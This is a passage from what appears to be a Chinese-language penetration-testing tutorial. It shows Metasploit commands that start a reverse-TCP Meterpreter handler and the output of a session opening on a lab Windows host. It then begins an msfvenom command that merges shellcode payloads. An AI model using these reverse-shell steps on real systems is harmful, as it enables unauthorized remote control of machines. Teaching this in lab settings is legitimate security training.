  \ as: payload.exe\n```\n\n15. 接下来，我们需要在 Metasploit 中使用 Generic Payload Handler 漏洞利用模块设置监听器：\n\
  \n```\nroot@kali:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(handler)\
  \ > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\n\
  msf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler)\
  \ > run\n```\n\n```\n[*] Started reverse TCP handler on 192.168.216.5:4444\n```\n\
  \n16. 现在监听器已准备就绪，我们只需将有效载荷下载到 Windows 目标机器并运行它，这应该会返回一个新的会话：\n\n```\nmsf exploit(handler)\
  \ > run\n\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] Sending stage\
  \ (179779 bytes) to 192.168.216.10\n[*] Meterpreter session 1 opened\n(192.168.216.5:4444\
  \ -> 192.168.216.10:49675) at 2017-12-11 15:46:11 +0000\n\nmeterpreter >\n```\n\n\
  通过使用 -c 或 --add-code 选项指定额外的 win32 shellcode，我们可以将多个有效载荷合并为一个。\n\n17. 首先，我们将使用 windows/messagebox\
  \ 有效载荷创建一个简单的有效载荷，在目标上弹出一条消息：\n\n```\nroot@kali:~# msfvenom -a x86 --platform windows\
